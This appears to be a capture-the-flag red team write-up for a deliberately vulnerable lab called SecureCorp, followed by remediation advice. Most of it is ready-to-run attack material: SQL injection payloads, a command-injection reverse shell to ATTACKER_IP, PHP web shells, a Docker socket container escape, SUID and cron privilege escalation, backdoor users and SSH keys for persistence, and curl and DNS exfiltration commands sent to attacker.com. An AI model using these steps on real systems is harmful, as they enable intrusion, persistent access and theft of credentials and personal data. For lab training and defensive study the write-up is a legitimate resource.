# 🔴 Red Team Writeup - SecureCorp Challenge

## 🎯 Objective
Penetrate SecureCorp's employee portal and escalate privileges to gain root access on the host system.

---

## 📊 Attack Overview

**Attack Chain**: Web App → RCE → Container Escape → Privilege Escalation → Root Access

**Total Time**: ~3-4 hours  
**Difficulty**: Medium  
**Points Available**: 140 points

---

## 🔍 Phase 1: Reconnaissance (15 points)

### Initial Target Discovery
```bash
# Target IP discovery
nmap -sn 192.168.1.0/24  # Adjust to your network
# Target found: 192.168.1.10

# Port scanning
nmap -sS -sV -O 192.168.1.10
```

**Expected Results**:
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9
80/tcp   open  http       Apache 2.4.41
3306/tcp open  mysql      MySQL 5.7.44
5601/tcp open  kibana     Kibana 7.14.0
8080/tcp open  http       Apache 2.4.41 (PHP/7.4)
9200/tcp open  http       Elasticsearch 7.14.0
```

### Web Application Discovery
```bash
# Directory enumeration
gobuster dir -u http://192.168.1.10:8080 -w /usr/share/wordlists/dirb/common.txt

# Expected findings:
# /debug.php (200)
# /backup.sh (200)
# /uploads/ (200)
# /pages/ (403)
```

**Key Findings**:
- Web application on port 8080
- MySQL exposed on port 3306
- Elasticsearch exposed on port 9200 (info disclosure)
- Debug page accessible
- File upload functionality exists

---

## 🔓 Phase 2: Web Application Exploitation (25 points)

### 2.1 Information Gathering via Debug Page

**Target**: `http://192.168.1.10:8080/debug.php`

**Critical Information Disclosed**:
```
Database Credentials:
- Host: db
- Username: webapp  
- Password: w3bp@ss123
- Database: securecorp

Application Secrets:
- SECRET_KEY: super_secret_key_123
- API_TOKEN: sk-1234567890abcdef
- AWS_ACCESS_KEY: AKIAIOSFODNN7EXAMPLE
- AWS_SECRET_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

Upload Directory: /var/www/html/uploads/
```

### 2.2 SQL Injection - Authentication Bypass

**Target**: Login form at `http://192.168.1.10:8080/`

**Vulnerable Code Analysis**:
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Exploitation**:
```sql
Username: admin' OR '1'='1' -- 
Password: anything
```

**Alternative Payloads**:
```sql
# Union-based injection for data extraction
Username: admin' UNION SELECT 1,username,password,email,role,5,6,7 FROM users-- 
Password: anything

# Boolean-based enumeration
Username: admin' AND (SELECT COUNT(*) FROM users)>0-- 
Password: anything
```

**Result**: Successfully bypassed authentication and gained access to dashboard.

### 2.3 Database Enumeration via Direct Connection

```bash
# Connect to exposed MySQL
mysql -h 192.168.1.10 -P 3306 -u webapp -pw3bp@ss123 securecorp

# Enumerate tables
SHOW TABLES;

# Extract sensitive data
SELECT * FROM users;
SELECT * FROM employees;  -- Contains SSN and salary info
SELECT * FROM system_config WHERE is_sensitive = TRUE;
```

**Sensitive Data Found**:
- User credentials (plaintext passwords)
- Employee SSN and salary information
- System configuration secrets
- Internal network information

---

## 💻 Phase 3: Remote Code Execution (20 points)

### 3.1 Command Injection via Network Tools

**Target**: `http://192.168.1.10:8080/dashboard.php?page=network`

**Vulnerable Code**:
```php
$output = shell_exec("ping -c 3 $host 2>&1");
```

**Exploitation**:
```bash
# Basic command injection
Host: google.com; id

# Information gathering
Host: google.com; cat /etc/passwd

# Reverse shell payload
Host: google.com; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Setup Listener**:
```bash
# On attacker machine
nc -lvnp 4444
```

### 3.2 File Upload Vulnerability

**Target**: `http://192.168.1.10:8080/dashboard.php?page=files`

**PHP Web Shell Upload**:
```php
<?php
// Save as shell.php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**Exploitation Steps**:
1. Upload `shell.php` via file upload form
2. Access: `http://192.168.1.10:8080/uploads/shell.php?cmd=id`
3. Execute commands: `?cmd=whoami`, `?cmd=pwd`, `?cmd=ls -la`

### 3.3 Advanced Web Shell

**PHP Reverse Shell**:
```php
<?php
// Save as revshell.php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'ATTACKER_IP';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// ... (full reverse shell code)
exec("/bin/sh -c '$shell'");
?>
```

**Result**: Established persistent reverse shell access as `www-data` user.

---

## 🐳 Phase 4: Container Escape (25 points)

### 4.1 Container Environment Analysis

```bash
# Verify we're in a container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Check mounted volumes
mount | grep docker

# Key finding: Docker socket is mounted
# /var/run/docker.sock:/var/run/docker.sock
```

### 4.2 Docker Socket Exploitation

```bash
# Verify docker access
docker ps

# List available images
docker images

# Create privileged container with host filesystem mounted
docker run -it --privileged --pid=host --net=host --volume /:/host alpine chroot /host bash
```

**Alternative Method - Using Custom Binary**:
```bash
# Use the intentionally vulnerable binary
/usr/local/bin/docker_helper

# This binary runs with SUID permissions and executes docker commands
```

### 4.3 Host Filesystem Access

**After successful container escape**:
```bash
# Now we have host access
whoami  # Should show root or host user
id
pwd     # Should be on host filesystem

# Verify escape success
ls -la /root
cat /etc/hostname  # Different from container hostname
```

---

## ⬆️ Phase 5: Privilege Escalation (30 points)

### 5.1 SUID Binary Exploitation

**Discovery**:
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Key finding: /usr/local/bin/check_file
ls -la /usr/local/bin/check_file
# -rwsr-xr-x 1 root root ... /usr/local/bin/check_file
```

**Exploitation**:
```bash
# Analyze binary behavior
/usr/local/bin/check_file /etc/passwd

# Command injection vulnerability
/usr/local/bin/check_file "/etc/passwd; id"
/usr/local/bin/check_file "/etc/passwd; whoami"

# Escalate to root shell
/usr/local/bin/check_file "/etc/passwd; /bin/bash"
```

### 5.2 Cron Job Manipulation

**Discovery**:
```bash
# Check cron jobs
crontab -l
cat /etc/crontab

# Key finding: */5 * * * * root /usr/local/bin/system_cleanup.sh
cat /usr/local/bin/system_cleanup.sh
```

**Exploitation**:
```bash
# Create malicious task file
mkdir -p /tmp/cleanup_tasks
echo "cleanup:/bin/bash -c 'cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell'" > /tmp/cleanup_tasks/tasks.txt

# Wait for cron to execute (up to 5 minutes)
# Then use the SUID shell
/tmp/rootshell -p
```

### 5.3 Service Exploitation

**Monitor Service Vulnerability**:
```bash
# Check running services
systemctl list-units --type=service | grep monitor
systemctl status monitor-service

# Exploit configuration file
echo 'enable_commands=true' > /etc/monitor/config.conf
echo '/bin/bash -c "cp /bin/bash /tmp/service_shell; chmod 4755 /tmp/service_shell"' > /tmp/monitor_commands

# Wait for service to process
/tmp/service_shell -p
```

---

## 🎯 Phase 6: Persistence & Data Exfiltration (25 points)

### 6.1 Establish Persistence

**SSH Key Installation**:
```bash
# Generate SSH key pair on attacker machine
ssh-keygen -t rsa -b 4096 -f ~/.ssh/securecorp_key

# Add public key to target
mkdir -p /root/.ssh
echo "ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

**Backdoor User Creation**:
```bash
# Create hidden user
useradd -m -s /bin/bash .backup
echo ".backup:backup123" | chpasswd
usermod -aG sudo .backup

# Hide from w/who commands (optional)
```

**Backdoor Web Shell**:
```bash
# Install persistent web shell
cp /tmp/shell.php /var/www/html/.config.php
chmod 644 /var/www/html/.config.php
chown www-data:www-data /var/www/html/.config.php
```

### 6.2 Data Exfiltration

**Database Dump**:
```bash
# Full database export
mysqldump -u root -pr00tp@ss123 --all-databases > /tmp/database_dump.sql

# Sensitive tables only
mysqldump -u root -pr00tp@ss123 securecorp employees system_config > /tmp/sensitive_data.sql
```

**System Information**:
```bash
# Network configuration
ip addr > /tmp/network_info.txt
route -n >> /tmp/network_info.txt

# User accounts
cat /etc/passwd > /tmp/users.txt
cat /etc/shadow > /tmp/passwords.txt

# System configuration
cat /etc/fstab > /tmp/system_config.txt
crontab -l >> /tmp/system_config.txt
```

**Exfiltration Methods**:
```bash
# HTTP POST exfiltration
curl -X POST -F "file=@/tmp/database_dump.sql" http://attacker.com/upload.php

# Base64 encoding for stealth
base64 -w 0 /tmp/sensitive_data.sql | curl -X POST -d @- http://attacker.com/data

# DNS exfiltration (if other methods blocked)
cat /tmp/sensitive_data.sql | xxd -p | fold -w 32 | while read line; do nslookup $line.attacker.com; done
```

---

## 🏆 Mission Accomplished

### Final Status
- ✅ **Initial Access**: Web application compromised
- ✅ **Code Execution**: Remote shell established  
- ✅ **Container Escape**: Successfully escaped Docker container
- ✅ **Privilege Escalation**: Gained root access on host
- ✅ **Persistence**: Multiple backdoors installed
- ✅ **Data Exfiltration**: Sensitive data extracted

### Total Points Earned: 140/140

---

## 🔍 Key Vulnerabilities Exploited

1. **Information Disclosure** - Debug page revealed credentials
2. **SQL Injection** - Authentication bypass
3. **Command Injection** - Remote code execution
4. **File Upload** - Web shell deployment
5. **Container Misconfiguration** - Docker socket exposure
6. **SUID Binary** - Privilege escalation
7. **Cron Job Manipulation** - Scheduled task abuse
8. **Service Misconfiguration** - System service exploitation

---

## 🛡️ Remediation Recommendations

### Immediate Actions
1. **Disable debug page** in production
2. **Implement parameterized queries** for SQL injection prevention
3. **Input validation** for all user inputs
4. **File upload restrictions** with proper validation
5. **Remove Docker socket mount** from containers
6. **Fix SUID binary** command injection vulnerability
7. **Secure cron jobs** with proper input validation
8. **Harden service configurations**

### Long-term Security Improvements
1. **Web Application Firewall (WAF)** deployment
2. **Container security scanning** and hardening
3. **Privilege separation** and least privilege principle
4. **Regular security audits** and penetration testing
5. **Employee security training** and awareness
6. **Incident response plan** development
7. **Network segmentation** and access controls

---

## 📚 Tools Used

### Reconnaissance
- `nmap` - Network scanning
- `gobuster` - Directory enumeration
- `curl` - HTTP requests

### Exploitation
- `sqlmap` - SQL injection automation
- `burp suite` - Web application testing
- `netcat` - Reverse shell listener
- Custom PHP shells

### Post-Exploitation
- `docker` - Container manipulation
- Native Linux tools - `find`, `ps`, `netstat`
- `mysqldump` - Database extraction

### Persistence
- SSH key management
- System service manipulation
- Scheduled task abuse

---

**Red Team Mission: COMPLETE ✅**

*This writeup demonstrates a complete attack chain from initial reconnaissance to full system compromise, showcasing multiple vulnerability classes and exploitation techniques in a realistic corporate environment.*
